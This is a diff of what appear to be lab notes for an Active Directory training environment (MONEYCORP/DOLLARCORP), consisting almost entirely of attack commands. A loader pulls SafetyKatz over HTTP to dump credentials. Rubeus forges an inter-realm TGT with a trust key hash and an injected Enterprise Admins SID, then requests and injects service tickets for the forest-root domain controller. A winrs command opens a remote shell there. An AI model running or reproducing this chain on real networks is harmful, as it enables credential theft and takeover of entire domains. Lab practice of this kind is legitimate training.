@@ -17,10 +17,17 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 
 Forge interrealm TGT
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:f03c20c4974d6f6426f4f3c9b4487549 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:2a362666cdb9580fefb48d0bdf8d7e9b /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
+
 ```
 
 Use ticket
 ```powershell
 C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
+
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgs /service:cifs/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
+```
+
+```powershell
+winrs -r:mcorp-dc.MONEYCORP.LOCAL cmd
 ```
